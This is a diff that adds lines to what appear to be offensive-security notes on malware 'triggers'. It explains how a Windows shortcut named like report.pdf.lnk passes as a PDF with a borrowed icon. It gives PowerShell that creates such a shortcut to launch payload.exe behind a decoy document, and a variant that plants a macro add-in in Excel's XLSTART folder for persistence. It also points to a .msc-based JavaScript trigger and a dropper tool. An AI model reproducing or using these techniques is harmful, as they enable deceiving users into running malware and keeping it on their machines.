@@ -90,5 +90,19 @@ triggers:
   shell link (.lnk):
     binary file format used to create windows shortcuts
     these are special bc the .lnk wont show in explorer, so we can name a file report.pdf.lnk and it will show as report.pdf
-
-    
+    further, we can decide what icon is displayed so it is a powerfully deceptive trigger
+    to create a link we can use the WScript.Shell COM object via PowerShell:
+      $wsh = New-Object -ComObject WScript.Shell
+      $lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
+      $lnk.TargetPath = "%COMSPEC%"
+      $lnk.Arguments = "/C start payload.exe && start decoy.pdf"
+      $lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
+      $lnk.Save()
+    example for XLAM:
+      $lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
+      $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
+      $lnk.Save()
+  microsoft saved console (.msc):
+    uses a .msc file and an XXS flaw to trigger JavaScript via microsoft management console
+      ex. https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4 (line 105)
+      tool: https://github.com/ZERODETECTION/MSC_Dropper
